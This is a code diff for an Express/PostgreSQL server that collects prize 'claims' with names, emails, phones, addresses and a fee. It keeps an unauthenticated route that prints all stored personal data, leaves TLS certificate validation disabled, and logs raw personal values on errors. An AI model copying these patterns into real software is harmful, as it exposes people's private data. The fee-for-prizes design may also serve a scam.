@@ -3,12 +3,9 @@ const path = require('path');
 const { Pool } = require('pg');
 
 const app = express();
-// Using process.env.PORT (or a default like 3000) is best practice for cloud hosting.
 const PORT = process.env.PORT || 3000; 
 
-// Middleware to parse JSON bodies
 app.use(express.json());
-// Serve the frontend file (index.html) and other static assets
 app.use(express.static(path.join(__dirname)));
 
 // --- PostgreSQL Database Setup ---
@@ -20,14 +17,12 @@ if (!DATABASE_URL) {
 
 const pool = new Pool({
     connectionString: DATABASE_URL,
-    
-    // CRITICAL FIX: Enable SSL for cloud-hosted databases (like Render)
     ssl: DATABASE_URL ? {
-        rejectUnauthorized: false // Required for some hosted services
+        rejectUnauthorized: false
     } : false
 });
 
-// Function to ensure the 'claims' table exists without destroying existing data
+// Function to ensure the 'claims' table exists (Non-destructive)
 const setupDatabase = async () => {
     if (!DATABASE_URL) {
         console.log("Skipping database setup as DATABASE_URL is missing.");
@@ -36,7 +31,7 @@ const setupDatabase = async () => {
     try {
         const client = await pool.connect();
         
-        // FIX: We now use IF NOT EXISTS to ensure data is persistent across deployments.
+        // FIX 1: Use IF NOT EXISTS for persistent data storage.
         await client.query(`
             CREATE TABLE IF NOT EXISTS claims (
                 id SERIAL PRIMARY KEY,
@@ -51,27 +46,26 @@ const setupDatabase = async () => {
             );
         `);
         client.release();
-        console.log("PostgreSQL: 'claims' table structure verified. Data is now safe and persistent.");
+        console.log("PostgreSQL: 'claims' table structure verified. Data is now persistent.");
     } catch (err) {
-        console.error("PostgreSQL Error: Failed to set up database.", err.stack);
+        console.error("PostgreSQL CRITICAL SETUP ERROR:", err.stack);
     }
 };
 
-// Initialize database setup
 setupDatabase();
 
 
 // =========================================================
-// TEMPORARY DATA RETRIEVAL ROUTE (GET /view-data)
+// TEMPORARY DATA RETRIEVAL ROUTE (GET /view-claims)
 // =========================================================
-app.get('/view-data', async (req, res) => {
+// FIX 2: Reverting to the old name (/view-claims) for user convenience.
+app.get('/view-claims', async (req, res) => {
     if (!DATABASE_URL) {
         return res.status(500).set('Content-Type', 'text/plain').send('Database not configured.');
     }
     
     try {
         const client = await pool.connect();
-        // Select all claims, ordered by the latest one
         const result = await client.query('SELECT * FROM claims ORDER BY claim_date DESC;');
         const claims = result.rows;
         client.release();
@@ -85,7 +79,7 @@ app.get('/view-data', async (req, res) => {
         
         claims.forEach((claim, index) => {
             output += `\n=======================================================\n`;
-            output += `CLAIM #${claim.id || index + 1} | DATE: ${claim.claim_date.toLocaleString()}\n`;
+            output += `CLAIM ID: ${claim.id || index + 1} | DATE: ${claim.claim_date.toLocaleString()}\n`;
             output += `=======================================================\n`;
             output += `Full Name: ${claim.full_name}\n`;
             output += `Email: ${claim.email}\n`;
@@ -94,9 +88,7 @@ app.get('/view-data', async (req, res) => {
             output += `Address: ${claim.full_address}\n`;
             output += `Total Fee: $${claim.total_fee}\n`;
             
-            // Format the JSON prize data neatly
             try {
-                // claim.selected_prizes is already parsed by pg, but we re-stringify for clean formatting
                 const prizes = claim.selected_prizes;
                 output += `Selected Prizes:\n${JSON.stringify(prizes, null, 2)}\n`;
             } catch (e) {
@@ -104,16 +96,14 @@ app.get('/view-data', async (req, res) => {
             }
         });
         
-        // Set content type to plain text for direct viewing in the browser
         res.set('Content-Type', 'text/plain');
         res.send(output);
 
     } catch (err) {
-        console.error('Error fetching claims:', err);
+        console.error('Database Retrieval Error:', err);
         res.status(500).set('Content-Type', 'text/plain').send(`CRITICAL ERROR FETCHING DATA: ${err.message}`);
     }
 });
-// =========================================================
 
 
 // --- POST /claim Route Handler (Data Insertion) ---
@@ -128,6 +118,16 @@ app.post('/claim', async (req, res) => {
     if (!fullName || !email || !fullAddress || !selectedPrizes || totalFee === undefined) {
         return res.status(400).json({ success: false, message: 'Missing required claim fields.' });
     }
+    
+    const values = [
+        fullName, 
+        email, 
+        phone, 
+        city, 
+        fullAddress, 
+        JSON.stringify(selectedPrizes), 
+        parseInt(totalFee, 10)
+    ];
 
     try {
         const client = await pool.connect();
@@ -138,16 +138,6 @@ app.post('/claim', async (req, res) => {
             RETURNING id;
         `;
         
-        const values = [
-            fullName, 
-            email, 
-            phone, 
-            city, 
-            fullAddress, 
-            JSON.stringify(selectedPrizes), 
-            parseInt(totalFee, 10)
-        ];
-
         const result = await client.query(query, values);
         client.release();
 
@@ -161,7 +151,10 @@ app.post('/claim', async (req, res) => {
         });
 
     } catch (err) {
-        console.error("Database Insert Error:", err.stack);
+        // DEBUGGING LOG: Print the error and the values being inserted
+        console.error("DATABASE INSERT FAILED. ERROR DETAILS:", err.stack);
+        console.error("Attempted values:", values); 
+        
         res.status(500).json({ 
             success: false, 
             message: 'Claim failed due to a database error. Check server logs for details.',
